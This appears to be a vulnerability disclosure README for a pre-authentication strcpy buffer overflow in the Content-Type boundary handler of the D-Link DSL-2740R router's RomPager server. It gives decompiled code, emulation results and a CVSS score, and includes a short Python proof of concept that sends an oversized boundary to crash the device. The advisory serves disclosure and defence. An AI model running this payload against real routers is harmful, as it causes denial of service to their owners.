# Pre-Authentication Buffer Overflow in the Content-Type multipart boundary Handler of D-Link DSL-2740R (RomPager HTTP Server)

> **Status:** CVE: Not assigned (identifier requested). Vendor notification: pending. Repository published for coordinated disclosure.

## Summary

A buffer overflow vulnerability was discovered in D-Link DSL-2740R firmware EU_1.17. The handler
for the HTTP `Content-Type:` header, registered in the same RomPager 4.07 header dispatch table,
copies the value of the `boundary=` parameter of `multipart/form-data` content types with an
**unbounded `strcpy`** into a connection-structure field designed to hold 70 bytes (the RFC 2046
boundary length limit). The code performs no length check; the only constraint is the 641-byte
header line buffer, allowing a boundary of up to ~595 bytes. An unauthenticated remote attacker can
overwrite ~530 bytes of the multipart parser working storage with controlled data using a single
HTTP request to any URL, causing denial of service and parser-state confusion.

## Affected Product

- Vendor: D-Link
- Product: DSL-2740R (Hardware Revision A)
- Firmware: EU_1.17 — **the latest publicly released firmware** (product EOL since 2020).
  Firmware MD5 `780553118fec108509855bd6b4a82e4d`, obtained from the official mirror ftp.dlink.de.
- Affected range (inferred, not binary-verified): EU_1.15 and older (2010-03-01 build, predates
  all RomPager security fixes).

## Vulnerability Details

- Type: CWE-787 (Out-of-bounds Write) / CWE-120 (Classic Buffer Overflow)
- Location: `FUN_80156a98` @ firmware offset 0x80156a98 — the `content-type` header handler
  registered by `FUN_80157764` in the RomPager header dispatch table (table @ 0x80381328).
- Root cause: after detecting `multipart/form-data`, the handler locates the `boundary=` value,
  faithfully stores its length into `conn+0x6b08`, and then copies the value with an unbounded
  `strcpy` (`FUN_8025c7d0`) into `conn+0x6d30`. The field's designed capacity is 70 bytes
  (0x6d30–0x6d76, matching the RFC 2046 limit of 70 characters); the code never enforces it.
  The only effective limit is the 0x281-byte (641) header line buffer, i.e. a boundary of up to
  ~595 bytes after subtracting the `content-type: multipart/form-data; boundary=` prefix.

Cleaned decompilation of the vulnerable path of `FUN_80156a98`:

```c
if (strncasecmp_(uVar2, "boundary", 8) == 0) {
    iVar1 = strchr_(uVar2, '=') + 1;                 // -> boundary value
    iVar3 = strlen_(iVar1);
    *(int *)(param_1 + 0x6b08) = iVar3;              // length word stores the REAL (over-long) length
    *(undefined1 *)(iVar1 + iVar3) = 0;
    strcpy(param_1 + 0x6d30, iVar1);                 // boundary -> conn+0x6d30  *** UNBOUNDED ***
}
```

Like all header handlers, this runs during header parsing via dispatcher `FUN_801566fc`
(`handler(conn, value_start, first_word_length)`) — **before** authentication (state 9 of
`FUN_80157c90`) and independently of the request URL or method.

## Proof of Concept (non-destructive)

```bash
python3 - << 'EOF'
import socket
boundary = b"A" * 400                       # >70-byte design capacity, < 641-byte line limit
body = b"--" + boundary + b"\r\nContent-Disposition: form-data; name=\"x\"\r\n\r\n1\r\n--" + boundary + b"--\r\n"
req = (b"POST /Forms/upload_1 HTTP/1.0\r\nHost: r\r\n"
       b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
       b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body)
s = socket.create_connection(("192.168.1.1", 80), timeout=5)   # replace with target IP
s.sendall(req)
print(s.recv(256))
EOF
```

Any URL works — the header handler runs before routing; `/Forms/upload_1` is used here only
because it is a natural multipart endpoint. Expected (vulnerable): the 400-byte boundary is copied
in full into the 70-byte field, overflowing 330+ bytes into the multipart parser working storage
(leftover buffer at `conn+0x6d76`, line-reassembly buffer at `conn+0x6dc4`); the parser then runs
on corrupted state during the same request's body parsing — the web service stops responding /
the device reboots. A normal 22-byte boundary (e.g. `----WebKitFormBoundary`) is stored correctly
with no overflow (control group).

A ready-made non-destructive script is provided: [`poc_find0003.py`](poc_find0003.py). It performs
a liveness probe, sends one overflow request, and probes again; it writes nothing to flash and
changes no configuration.

### Verification evidence (function-level emulation of the original firmware code)

Verified by executing the unmodified firmware function `FUN_80156a98` under Unicorn Engine 2.1.4
(MIPS32 BE), 4/4 test cases:

| Case | Result |
|---|---|
| `multipart/form-data; boundary=----WebKitFormBoundary` (52 B value) | 22-byte boundary correctly stored at `conn+0x6d30`, length word 22 at `conn+0x6b08`, type enum correct — baseline matches design |
| `application/x-www-form-urlencoded` (33 B) | Type stored correctly, no boundary, no overflow |
| `multipart/form-data; boundary=` + `'A'*600` (630 B) | **All 600 bytes written to `conn+0x6d30`, reaching `conn+0x6F89` — 531 bytes past the 0x6d76 design boundary, fully controlled (0x41)** |
| `multipart/form-data; boundary=` + `'B'*64` (94 B) | 64 bytes written, stays within 0x6d76 — confirms ~70-byte design capacity |

Constraint: boundary up to ~595 bytes (641-byte line limit minus the fixed prefix); may contain
any byte except NUL/CR/LF.

**Honesty note:** no physical device was available. All dynamic evidence comes from function-level
emulation of the original firmware machine code; the full socket-to-dispatcher chain was not
emulated, and a device-level crash was not observed.

## Impact

- Attacker profile: unauthenticated, adjacent network (LAN); reachable from the internet only if
  remote management is enabled (disabled by default).
- Prerequisites: none — the handler executes for every request containing the header, any URL,
  any method.
- Consequence: remote memory corruption of the multipart parser working storage (pure data, no
  pointers) → **denial of service** (web service crash / device reboot) and **parser-state
  confusion** (attacker-controlled leftover bytes participate in subsequent line reassembly and
  may mislead part-boundary detection). Code execution is assessed as unlikely: the overflow
  region contains no pointers, and the file-write path behind multipart parsing (firmware upload)
  requires authentication and a specific endpoint, unreachable for a pre-auth attacker.
- Relation to the sibling finding: same pattern family ("RomPager header handler performs
  unbounded strcpy into a fixed connection-structure field") but a different function
  (0x80156a98 vs 0x801573ec), different input header, different victim fields and different
  overflow region — a separate fix is required.

## CVSS 3.1

**6.5** — `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`

Justification: adjacent-network, unauthenticated, single-request trigger with demonstrated
availability-affecting memory corruption on the original firmware code. Scored on demonstrated
impact (DoS); no confidentiality/integrity impact claimed. Device-level crash was not observed on
hardware (no physical device available); if scored strictly on hardware-observed effects only, the
conservative alternative is `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N` (3.5).

## Discovery

Discovered by Zimo-666 on 2026-10-12 via static reverse engineering (Ghidra) and function-level
dynamic verification (Unicorn Engine) of the official EU_1.17 firmware image.
Vendor notified: pending (see repository timeline).
